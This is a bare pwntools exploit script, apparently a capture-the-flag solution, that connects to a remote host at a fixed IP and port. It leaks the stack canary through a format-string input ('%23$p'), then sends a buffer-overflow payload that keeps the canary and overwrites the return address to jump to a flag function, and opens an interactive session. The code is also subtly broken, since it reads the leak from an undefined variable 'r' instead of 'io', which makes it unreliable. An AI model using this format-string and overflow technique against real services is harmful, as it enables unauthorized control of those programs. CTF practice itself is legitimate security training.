
from pwn import *
io=remote("61.147.171.105",54078)
flag_addr=0x004008DA
io.sendlineafter('3. Exit the battle',b'2')
io.sendline('%23$p')
io.recvuntil('0x')
canary=int(r.recv(16),16)
payload=b'a'*0x88+p64(canary)+b'a'*8+p64(flag_addr)
io.recvuntil('3. Exit the battle')
io.sendline('1')
io.sendline(payload)
io.interactive()
